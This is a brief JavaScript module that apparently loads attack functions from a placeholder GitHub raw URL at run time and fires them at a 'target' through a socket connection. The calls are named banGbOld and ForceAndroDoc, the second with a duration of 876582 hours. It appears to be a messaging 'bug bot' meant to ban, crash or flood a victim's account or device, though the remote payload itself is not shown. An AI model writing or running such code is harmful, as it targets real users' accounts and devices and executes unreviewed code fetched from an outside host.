const { getGithub } = require("./loader.js");

const API_URL =
    "https://raw.githubusercontent.com/USERNAME/REPOSITORY/main";

async function example(sock, target) {
    const api = await getGithub(API_URL, sock);
    await api.banGbOld(target);
    await api.ForceAndroDoc(sock, target, durationHours = 876582);
    await api.supportHeader(sock);
}

module.exports = {
    getGithub
};
